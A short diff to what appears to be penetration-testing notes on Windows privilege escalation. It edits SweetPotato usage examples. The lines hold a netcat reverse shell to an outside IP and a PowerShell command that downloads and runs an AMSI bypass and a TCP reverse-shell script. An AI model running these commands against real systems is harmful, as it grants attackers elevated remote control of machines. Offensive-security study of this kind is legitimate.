@@ -344,7 +344,7 @@ While PrintSpoofer provided us a straightforward exploit process to elevate our 
 
 Sweetpotato examples:
 ```shell
-.\SweetPotato.exe -a "C:\Windows\Temp\nc.exe -e cmd.exe 10.10.112.147 8081"
+.\SweetPotato.exe -a "C:\tools\nc.exe -e cmd.exe 192.168.45.210 1234"
 ./SweetPotato.exe -a "/c powershell.exe iex (New-Object Net.WebClient).DownloadString('http://<IP>:8090/amsi.txt'); iex (New-Object Net.WebClient).DownloadString('http://<IP>:8090/Invoke-PowerShellTcp2.ps1')"
 ```
 
